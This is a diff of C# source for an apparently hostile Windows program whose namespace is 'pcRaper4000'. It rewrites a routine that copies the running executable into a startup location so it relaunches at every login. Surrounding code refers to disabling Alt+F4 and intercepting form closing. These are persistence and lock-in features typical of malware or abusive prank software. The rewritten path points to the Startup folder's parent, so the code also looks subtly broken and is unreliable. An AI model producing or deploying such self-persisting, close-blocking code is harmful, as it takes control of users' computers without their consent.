@@ -53,16 +53,10 @@ namespace pcRaper4000
 
 
             //copy to startup
-            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
+            string sourceFileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, AppDomain.CurrentDomain.FriendlyName);
+            string destFileName = Path.Combine(Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).ToString(), AppDomain.CurrentDomain.FriendlyName);
+            File.Copy(sourceFileName, destFileName);
 
-            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
-
-            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;
-
-                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
-                {
-                    System.IO.File.Copy(Application.ExecutablePath, Filepath);
-                }
         }
         
         //disable alt f4
@@ -83,6 +77,5 @@ namespace pcRaper4000
             }
             base.OnFormClosing(e);
         }
-
     }
 }
